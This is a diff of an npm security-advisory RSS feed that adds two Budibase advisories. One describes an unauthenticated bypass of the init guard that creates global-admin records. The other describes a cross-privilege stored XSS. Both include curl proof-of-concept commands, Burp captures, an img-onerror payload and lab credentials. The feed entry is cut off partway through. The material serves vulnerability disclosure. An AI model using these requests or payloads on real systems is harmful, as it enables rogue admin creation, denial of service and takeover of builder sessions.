@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-11-20T18:05:58.685Z</updated>
+    <updated>2026-11-21T00:26:54.595Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,515 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)]]></title>
+        <id>https://github.com/advisories/GHSA-25qc-m4pw-2w8r</id>
+        <link href="https://github.com/advisories/GHSA-25qc-m4pw-2w8r"/>
+        <updated>2026-11-20T23:50:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<h3 id="summary">Summary</h3>
+<p>On a self-hosted, single-tenant Budibase instance (<code>multiTenancy:false</code>), the public bootstrap endpoint <code>POST /api/global/users/init</code> remains fully exploitable <strong>after</strong> the instance has been provisioned. Its "already initialised" guard (<code>checkAnyUserExists()</code>) is evaluated inside a <strong>tenant-scoped</strong> database context derived from an <strong>attacker-controlled <code>tenantId</code></strong> in the request body. Because the tenancy layer never constrains that <code>tenantId</code> to the only legitimate tenant (<code>default</code>) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (<code>&lt;tenantId&gt;_global-db</code>) and a <strong>global-admin</strong> user document (<code>admin.global = true</code>, <code>builder.global = true</code>) inside it - with no authentication and no CSRF token.</p>
+<p>This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.</p>
+<h3 id="details">Details</h3>
+<p>Root cause chain (source, tag v3.44.0):</p>
+<ol>
+<li><code>packages/worker/src/api/index.ts:41</code> - <code>POST /api/global/users/init</code> is in <code>PUBLIC_ENDPOINTS</code>, so <code>auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)</code> marks it <code>publicEndpoint</code> and the "no public access to worker" gate (<code>api/index.ts:159-165</code>) lets it through <strong>without any session</strong>. It is also in <code>NO_TENANCY_ENDPOINTS</code> (<code>api/index.ts:83</code>), so the tenancy middleware does <strong>not</strong> pin the request to <code>default</code> - the tenant is taken verbatim from the request body - and in <code>NO_CSRF_ENDPOINTS</code>.</li>
+<li><code>packages/worker/src/middleware/cloudRestricted.ts:10,25</code> - the <code>cloudRestricted</code> guard only enforces the internal API key when <code>!env.SELF_HOSTED &amp;&amp; !env.DISABLE_ACCOUNT_PORTAL</code>. On a self-hosted instance (<code>SELF_HOSTED=true</code>) it is a <strong>no-op</strong> (<code>return next()</code>), so <code>cloudRestrictedRoutes</code> provides no protection here.</li>
+<li><code>packages/worker/src/api/routes/global/users.ts:69-79</code> - <code>cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser)</code>.</li>
+<li><code>packages/worker/src/api/controllers/global/users.ts:232</code> - the handler runs <code>await tenancy.doInTenant(tenantId, …)</code> using the <strong>attacker-supplied</strong> <code>tenantId</code>.</li>
+<li><code>packages/worker/src/api/controllers/global/users.ts:238</code> - the only guard, <code>const userExists = await checkAnyUserExists()</code>, throws 403 only if a user exists <strong>in the current tenant context</strong>.</li>
+<li><code>packages/worker/src/utilities/users.ts:3-15</code> - <code>checkAnyUserExists()</code> calls <code>tenancy.getGlobalDB()</code>, which resolves to <code>&lt;tenantId&gt;_global-db</code>. For any unused <code>tenantId</code> this DB is empty → the guard passes → <code>userSdk.db.createAdminUser(email, tenantId, …)</code> (<code>users.ts:247</code>) creates a full global admin.</li>
+</ol>
+<p>The defect is <strong>incorrect authorization scoping</strong>: the single-tenant deployment invariant ("only tenant <code>default</code> exists; init is one-time") is never enforced against the request-supplied <code>tenantId</code>, so the guard is evaluated against a namespace the attacker chooses.</p>
+<p>Configuration confirmed via <code>GET /api/system/environment</code> → <code>{"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>Target <code>http://127.0.0.1:3014</code> (Budibase <code>v3.44.0-cloud.2</code>). <strong>No credentials, no cookies, no CSRF token.</strong> All values real, captured live on 2026-09-02; nothing redacted.</p>
+<hr>
+<h4 id="step-1---baseline-the-guard-correctly-blocks-re-init-of-the-real-tenant-default">Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (<code>default</code>)</h4>
+<pre><code class="language-bash">curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'
+</code></pre>
+<p><strong>Burp - Request</strong></p>
+<pre><code class="language-http">POST /api/global/users/init HTTP/1.1
+Host: 127.0.0.1:3014
+Content-Type: application/json
+Content-Length: 82
+
+{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+
+{"message":"You cannot initialise once an global user has been created.","status":403}
+</code></pre>
+<hr>
+<h4 id="step-2---payload-supply-any-unused-tenantid-→-the-guard-is-bypassed-and-a-global-admin-is-created-fully-unauthenticated">Step 2 - PAYLOAD: supply any unused <code>tenantId</code> → the guard is bypassed and a global admin is created, fully unauthenticated</h4>
+<pre><code class="language-bash">curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
+</code></pre>
+<p><strong>Burp - Request</strong></p>
+<pre><code class="language-http">POST /api/global/users/init HTTP/1.1
+Host: 127.0.0.1:3014
+Content-Type: application/json
+Content-Length: 78
+
+{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}
+</code></pre>
+<p>The single differential - <code>tenantId:"default"</code> → 403, <code>tenantId:"f7poc"</code> → 200 with a persisted <code>us_…</code> id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.</p>
+<hr>
+<h4 id="step-3---the-write-persisted-re-init-of-the-same-tenant-now-hits-the-per-tenant-guard">Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guard</h4>
+<pre><code class="language-bash">curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"pwn-f7pocb@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+
+{"message":"You cannot initialise once an global user has been created.","status":403}
+</code></pre>
+<p>Each unique <code>tenantId</code> is a fresh write primitive - an attacker loops <code>tenantId=a0001,a0002,…</code> to create unbounded databases + admin docs (DoS).</p>
+<hr>
+<h4 id="step-4--5---datastore-side-effect-a-new-tenant_global-db-and-a-real-global-admin-document">Step 4 &amp; 5 - datastore side-effect: a new <code>&lt;tenant&gt;_global-db</code> and a real global-admin document</h4>
+<p>Read directly from CouchDB inside the container (<code>$COUCH_DB_URL</code> = <code>http://admin:…@127.0.0.1:5984</code>):</p>
+<pre><code>GET /_all_dbs =&gt;
+[
+ "app_cc322a9cd27a492eb934f43b146c6e81",
+ "app_dev_cc322a9cd27a492eb934f43b146c6e81",
+ "f7poc_global-db",     &lt;-- created by the unauthenticated init call (tenantId=f7poc)
+ "global-db"            &lt;-- legitimate default-tenant global DB
+]
+
+rogue DB 'f7poc_global-db' present: True
+</code></pre>
+<p>The document created in <code>f7poc_global-db</code> is a full global admin:</p>
+<pre><code class="language-json">{
+  "_id": "us_d0c2b6c9014a43e2899a2770d2e6280c",
+  "email": "pwn-f7poc@evil.test",
+  "admin":   { "global": true },
+  "builder": { "global": true },
+  "tenantId": "default",
+  "roles": {}
+}
+</code></pre>
+<hr>
+<h4 id="step-6---ceiling-check-honest-the-injected-admin-cannot-log-in-while-multi-tenancy-is-off">Step 6 - ceiling check (honest): the injected admin cannot log in while multi-tenancy is off</h4>
+<pre><code class="language-bash">curl -s -i -X POST 'http://127.0.0.1:3014/api/global/auth/f7poc/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"pwn-f7poc@evil.test","password":"Pwned!2026#bb"}'
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+
+{"message":"Invalid credentials","status":403}
+</code></pre>
+<p>With <code>multiTenancy:false</code> the login flow forces the <code>default</code> tenant, so the injected admin is <strong>not</strong> usable to log into the running default-tenant instance. The provable impact is therefore control-bypass + unauthenticated persistent datastore writes / DoS + creation of rogue admin accounts that become active if multi-tenancy is later enabled or during tenant-iterating operations (restore/migration).</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Type:</strong> Missing/incorrect authorization on a critical function - <strong>unauthenticated bypass of the one-time initialization guard</strong>, yielding anonymous global-admin-document and database creation.</p>
+<p><strong>Who is impacted:</strong> every self-hosted single-tenant Budibase instance exposing the worker API (via the front nginx). Any unauthenticated network attacker can:</p>
+<ul>
+<li><strong>defeat the first-run setup lock</strong> that is supposed to be permanently closed after provisioning;</li>
+<li><strong>create global-admin user documents</strong> in attacker-named tenants with no credentials (latent rogue admins that activate if multi-tenancy is enabled or during migration/restore);</li>
+<li><strong>create an unbounded number of CouchDB databases</strong> (<code>&lt;rand&gt;_global-db</code>) and documents - a resource-exhaustion / DoS vector against the datastore (disk, inodes, file descriptors, the <code>_dbs</code> metadata shard).</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-25qc-m4pw-2w8r">https://github.com/Budibase/budibase/security/advisories/GHSA-25qc-m4pw-2w8r</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-122247">https://nvd.nist.gov/vuln/detail/CVE-2026-122247</a></li>
+<li><a href="https://github.com/Budibase/budibase/commit/362a7fe9aea594531ece1cf15be76cc00bfb88b9">https://github.com/Budibase/budibase/commit/362a7fe9aea594531ece1cf15be76cc00bfb88b9</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/v3.50.0">https://github.com/Budibase/budibase/releases/tag/v3.50.0</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/v4.0.0">https://github.com/Budibase/budibase/releases/tag/v4.0.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-25qc-m4pw-2w8r">https://github.com/advisories/GHSA-25qc-m4pw-2w8r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-25qc-m4pw-2w8r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-20T23:50:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/server] Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin]]></title>
+        <id>https://github.com/advisories/GHSA-r2q3-7m4h-63qg</id>
+        <link href="https://github.com/advisories/GHSA-r2q3-7m4h-63qg"/>
+        <updated>2026-11-20T23:49:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<h3 id="summary">Summary</h3>
+<p>A <strong>low-privileged application end-user</strong> (role <code>BASIC</code> - <strong>not</strong> a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a <strong>builder or admin</strong> later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section <strong>Formula</strong> column editor, or any binding drawer), the stored value is rendered as <strong>raw HTML</strong> and the attacker's JavaScript executes in the Builder's origin.</p>
+<p>The Builder SPA is served by nginx with <strong>no Content-Security-Policy</strong> (the CSP middleware only decorates the server-rendered <em>published-app</em> document, not <code>/builder/</code>). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a <strong>cross-privilege stored XSS</strong> (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS.</p>
+<h3 id="details">Details</h3>
+<p><strong>Root cause 1 - the escaper is a no-op.</strong>
+<code>packages/frontend-core/src/utils/jsonFormatter.ts</code> (<code>format()</code>):</p>
+<pre><code class="language-js">jsonString = jsonString
+  .replace(/&amp;/g, "&amp;")   // no-op: replaces "&amp;" with "&amp;"  (should be "&amp;amp;")
+  .replace(/&lt;/g, "&lt;")   // no-op                          (should be "&amp;lt;")
+  .replace(/&gt;/g, "&gt;")   // no-op                          (should be "&amp;gt;")
+
+return jsonString.replace(
+  /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g,
+  (match) =&gt; {
+    if (/^"/.test(match)) {
+      if (/:$/.test(match)) { color = colors.keyColor }                        // KEY: NOT escaped
+      else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped
+    }
+    return `&lt;span style="..."&gt;${match}&lt;/span&gt;`
+  })
+</code></pre>
+<p>Only quoted JSON <em>string values</em> are passed through <code>escapeHtml</code>. Everything else is emitted verbatim, because the leading <code>.replace(/&amp;/g,"&amp;")…</code> chain replaces each character with itself. Two consequences:</p>
+<ol>
+<li>A <strong>raw, non-JSON string</strong> (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned <strong>completely un-escaped</strong>.</li>
+<li><strong>Object keys</strong> are never escaped.</li>
+</ol>
+<p><strong>Root cause 2 - the output is injected with <code>{@html}</code>.</strong>
+<code>packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte</code>:</p>
+<ul>
+<li>line 116: <code>{@html logLine.log}</code></li>
+<li>line 128: <code>{@html highlightedResult}</code></li>
+</ul>
+<p><code>highlightedResult</code> is the output of <code>JsonFormatter.format()</code>, so the un-escaped attacker string is inserted into the DOM as live markup.</p>
+<p><strong>Root cause 3 - binding output is not entity-escaped upstream.</strong>
+Every <code>{{ … }}</code> statement is wrapped by the <code>ALL</code> helper in <code>packages/string-templates/src/helpers/index.ts</code>, which returns a <code>Handlebars.SafeString</code>; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/<code>{@html}</code> sink.</p>
+<p><strong>Root cause 4 - no CSP on the Builder.</strong>
+<code>GET /builder/*</code> is served as a static SPA by nginx with <strong>no</strong> <code>Content-Security-Policy</code> header (verified live below). The <code>contentSecurityPolicy</code> middleware (<code>packages/backend-core/src/middleware/contentSecurityPolicy.ts</code>) only sets a nonce-based CSP on the server-rendered <em>published-app</em> document (<code>serveApp</code>). So in the Builder origin there is no <code>script-src</code> restriction and inline event handlers run freely.</p>
+<p><strong>Cross-privilege data channel.</strong>
+Internal-table dev/prod data live in separate databases, but <strong>external datasources are queried live and shared</strong> between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A <code>BASIC</code> app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. <code>RowUtils.generateGoldenSample()</code> even <em>prefers the longest string per column</em>, guaranteeing a long payload is the sample the Preview evaluates.</p>
+<p><strong>Payload shape note.</strong> <code>jsonFormatter.format()</code> tokenises quoted strings, digits and <code>true/false/null</code> into <code>&lt;span&gt;</code>s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. <code>&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;</code> - survives verbatim and executes.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Environment used for this reproduction (all values real / unredacted):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Target</td>
+<td><code>http://127.0.0.1:3014</code> (self-host single image, Budibase <code>v3.44.0</code>, commit <code>d1ed6085</code>)</td>
+</tr>
+<tr>
+<td>Dev app id</td>
+<td><code>app_dev_cc322a9cd27a492eb934f43b146c6e81</code></td>
+</tr>
+<tr>
+<td>Prod app id</td>
+<td><code>app_cc322a9cd27a492eb934f43b146c6e81</code></td>
+</tr>
+<tr>
+<td>External Postgres table</td>
+<td><code>datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl</code></td>
+</tr>
+<tr>
+<td>Attacker (low-priv <code>BASIC</code>)</td>
+<td><code>lowuser@budibase.local</code> / <code>LowUser!2026#bb</code></td>
+</tr>
+<tr>
+<td>Victim (builder/admin)</td>
+<td><code>admin@budibase.local</code> / <code>LabAdmin!2026#bb</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="step-0---precondition-performed-once-by-the-builder-a-data-collection-app-grants-basic-write-on-the-table">Step 0 - (precondition, performed once by the builder) a data-collection app grants <code>BASIC</code> write on the table</h4>
+<pre><code class="language-bash"># grant the low user BASIC role on the app
+curl -s -b creds/admin.cookies -H "Content-Type: application/json" -X POST \
+  http://127.0.0.1:3014/api/global/users \
+  -d '{"_id":"us_df036f58299242608f665700b1618057","_rev":"1-f24520b49fae0a6f4a23dced7a82fcc8","email":"lowuser@budibase.local","builder":{"global":false},"admin":{"global":false},"roles":{"app_cc322a9cd27a492eb934f43b146c6e81":"BASIC"},"tenantId":"default","status":"active"}'
+
+# open write permission on the table to BASIC (typical of feedback/survey/contact apps)
+curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \
+  "http://127.0.0.1:3014/api/permission/BASIC/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/write"
+
+curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \
+  "http://127.0.0.1:3014/api/applications/app_dev_cc322a9cd27a492eb934f43b146c6e81/publish"
+</code></pre>
+<hr>
+<h4 id="step-1---attacker-logs-in-low-priv-basic-user">Step 1 - ATTACKER logs in (low-priv <code>BASIC</code> user)</h4>
+<pre><code class="language-bash">curl -s -i -c creds/low.cookies -H "Content-Type: application/json" -X POST \
+  http://127.0.0.1:3014/api/global/auth/default/login \
+  -d '{"username":"lowuser@budibase.local","password":"LowUser!2026#bb"}'
+</code></pre>
+<p><strong>Burp - Request</strong></p>
+<pre><code class="language-http">POST /api/global/auth/default/login HTTP/1.1
+Host: 127.0.0.1:3014
+Content-Type: application/json
+Content-Length: 71
+
+{"username":"lowuser@budibase.local","password":"LowUser!2026#bb"}
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 02 Sep 2026 07:20:45 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 30
+Connection: keep-alive
+x-budibase-tenant-id: default
+Set-Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA; path=/; expires=Wed, 09 Sep 2026 07:20:45 GMT; httponly
+Set-Cookie: budibase:auth.sig=au9QqX0g6Zd5rQs-AceJY6gLwWY; path=/; expires=Wed, 09 Sep 2026 07:20:45 GMT; httponly
+x-budibase-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA
+
+{"message":"Login successful"}
+</code></pre>
+<p>The low user's session JWT (decoded payload) confirms <strong><code>builder</code>/<code>admin</code> are absent</strong> - this is an ordinary app user:</p>
+<pre><code class="language-json">{"userId":"us_df036f58299242608f665700b1618057","sessionId":"4aacd94d0b444b81937d13150251 29e0","tenantId":"default","email":"lowuser@budibase.local","iat":1788333645,"exp":1788938445}
+</code></pre>
+<hr>
+<h4 id="step-2---attacker-stores-the-xss-payload-into-the-shared-external-table-via-the-publishedprod-app-id">Step 2 - ATTACKER stores the XSS payload into the shared external table (via the published/prod app id)</h4>
+<pre><code class="language-bash">curl -s -i -b creds/low.cookies \
+  -H "x-budibase-app-id: app_cc322a9cd27a492eb934f43b146c6e81" \
+  -H "Content-Type: application/json" -X POST \
+  "http://127.0.0.1:3014/api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows" \
+  -d '{"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;","email":"rx@x.tld"}'
+</code></pre>
+<p><strong>Burp - Request</strong></p>
+<pre><code class="language-http">POST /api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows HTTP/1.1
+Host: 127.0.0.1:3014
+x-budibase-app-id: app_cc322a9cd27a492eb934f43b146c6e81
+Content-Type: application/json
+Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA; budibase:auth.sig=au9QqX0g6Zd5rQs-AceJY6gLwWY
+Content-Length: 87
+
+{"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;","email":"rx@x.tld"}
+</code></pre>
+<p><strong>Burp - Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 02 Sep 2026 07:20:53 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 196
+Connection: keep-alive
+x-budibase-tenant-id: default
+
+{"id":7,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;","email":"rx@x.tld","_id":"%5B7%5D","tableId":"datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl","_rev":"rev"}
+</code></pre>
+<p>The payload is stored verbatim as <strong>row id=7</strong> in the shared Postgres table. The server performs <strong>no output-encoding or sanitisation</strong> of the <code>name</code> value.</p>
+<hr>
+<h4 id="step-3---proof-the-value-crosses-the-trust-boundary-victim-builderadmin-reads-the-same-row">Step 3 - proof the value crosses the trust boundary (VICTIM builder/admin reads the same row)</h4>
+<pre><code class="language-bash"># admin login
+curl -s -i -c creds/admin.cookies -H "Content-Type: application/json" -X POST \
+  http://127.0.0.1:3014/api/global/auth/default/login \
+  -d '{"username":"admin@budibase.local","password":"LabAdmin!2026#bb"}'
+
+# admin reads the row set from the DEV plane (what the Builder renders)
+curl -s -b creds/admin.cookies \
+  -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" \
+  "http://127.0.0.1:3014/api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows"
+</code></pre>
+<p><strong>Burp - admin login Response (real admin session JWT)</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Server: nginx
+x-budibase-tenant-id: default
+Set-Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19hNWVlYzBiMDJiMTA0YWEzYTczZjk3MDkwYmI2OTk5MCIsInNlc3Npb25JZCI6IjhlMGUwYjE5ODk5NDRhNDdiZDcxYmUwZTdlNzI5MWM4IiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJhZG1pbkBidWRpYmFzZS5sb2NhbCIsImlhdCI6MTc4ODMzMzYzOCwiZXhwIjoxNzg4OTM4NDM4fQ.LBqUOeujBaqUEDbwmfPpAgplprwyPcMzEpI7hW1UwQk; path=/; httponly
+Set-Cookie: budibase:auth.sig=iYVS67Sat7FptqQAprWzDE0Hs2o; path=/; httponly
+x-budibase-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19hNWVlYzBiMDJiMTA0YWEzYTczZjk3MDkwYmI2OTk5MCIsInNlc3Npb25JZCI6IjhlMGUwYjE5ODk5NDRhNDdiZDcxYmUwZTdlNzI5MWM4IiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJhZG1pbkBidWRpYmFzZS5sb2NhbCIsImlhdCI6MTc4ODMzMzYzOCwiZXhwIjoxNzg4OTM4NDM4fQ.LBqUOeujBaqUEDbwmfPpAgplprwyPcMzEpI7hW1UwQk
+
+{"message":"Login successful"}
+</code></pre>
+<p><strong>Burp - rows Response (admin reads the low-priv-authored payload - same string, cross-privilege)</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+[{"id":1,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;",...},
+ {"id":2,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;",...},
+ {"id":5,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;",...},
+ {"id":6,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;",...},
+ {"id":7,"name":"&lt;img src=x onerror=alert(window.xssproof=document.domain)&gt;","email":"rx@x.tld",...}]
+</code></pre>
+<hr>
+<h4 id="step-4---confirm-the-builder-origin-ships-no-content-security-policy">Step 4 - confirm the Builder origin ships NO Content-Security-Policy</h4>
+<pre><code class="language-bash">curl -s -D - -o /dev/null http://127.0.0.1:3014/builder/
+</code></pre>
+<p><strong>Burp - Response (note the complete absence of any <code>Content-Security-Policy</code> header)</strong></p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 02 Sep 2026 07:21:09 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Last-Modified: Thu, 27 Aug 2026 14:26:10 GMT
+Cache-Control: max-age=0
+Content-Encoding: gzip
+</code></pre>
+<hr>
+<h4 id="step-5---victim-triggers-execution-builderadmin-in-the-browser">Step 5 - VICTIM triggers execution (builder/admin, in the browser)</h4>
+<p>Logged into the Builder as <code>admin@budibase.local</code>, the victim opens the shared table and evaluates a binding over it - the ordinary workflow for building a Formula column:</p>
+<ol>
+<li>Open the app → <strong>Data tables</strong> → datasource <strong>LabPG</strong> → table <strong><code>users_tbl</code></strong>.</li>
+<li>Click the <strong>+</strong> to add a column, name it (e.g. <code>xsscol</code>), set <strong>Type = Formula</strong>.</li>
+<li>Click the <strong>lightning</strong> (binding) icon on the <em>Formula</em> field → the binding drawer opens.</li>
+<li>In the code editor type: <code>{{ name }}</code></li>
+<li>Click the <strong>play</strong> (▶ / evaluate) button.</li>
+</ol>
+<p>The right-hand <strong>Preview</strong> panel renders the stored value through <code>JsonFormatter.format()</code> → <code>{@html}</code>. The injected <code>&lt;img&gt;</code> is inserted as a <strong>live DOM element</strong>; its <code>onerror</code> fires and the attacker's JavaScript runs in the Builder origin.</p>
+<p><strong>Observed result (captured live in the reproduction):</strong></p>
+<pre><code>window.__xss_calls = ["localhost"]     // alert() was called with document.domain
+window.xssproof    = "localhost"       // attacker JS mutated the Builder's window object
+document.domain    = "localhost"       // execution context = the BUILDER origin
+location.href      = http://localhost:3014/builder/workspace/app_dev_cc322a9cd27a492eb934f43b146c6e81/data/table/...
+</code></pre>
+<p><strong>Popup - <code>alert(document.domain)</code> firing in the Builder origin, with the injected <code>&lt;img&gt;</code> visible as a broken-image element in the Preview panel:</strong></p>
+<p><img src="./F4-xss-alert-popup.png" alt="F4 stored XSS – alert popup in the Budibase Builder">
+<img width="1536" height="674" alt="F4-xss-alert-popup" src="https://github.com/user-attachments/assets/c9f7932b-0b1c-4165-863f-24e0bf8dceb7"></p>
+<blockquote>
